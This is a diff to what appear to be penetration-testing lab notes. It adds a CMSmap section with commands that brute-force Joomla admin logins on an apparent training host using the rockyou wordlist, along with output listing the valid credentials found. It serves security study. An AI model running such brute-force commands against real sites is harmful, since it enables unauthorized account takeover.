@@ -37,3 +37,22 @@ Please see the README file for information regarding proxies.
 ````bash
 droopescan scan --help.
 ````
+### CMSmap
+````bash
+git clone https://github.com/Dionach/CMSmap.git
+cd CMSmap
+
+python3 cmsmap.py http://app.inlanefreight.local -f J -F --usernames admin --passwords /usr/share/wordlists/rockyou.txt
+````
+results & attacking 
+````bash
+python3 cmsmap.py http://app.inlanefreight.local -u admin -p http_default_pass.txt
+[-] Date & Time: 02/03/2026 12:19:12
+[-] Target: http://app.inlanefreight.local (10.129.17.48)
+[-] Starting Brute Forcing: J
+[H] Valid Credentials: admin turnkey
+[H] Valid Credentials: admin vagrant
+[H] Valid Credentials: admin admin
+[-] Date & Time: 02/03/2026 12:19:25
+[-] Completed in: 0:00:13
+````
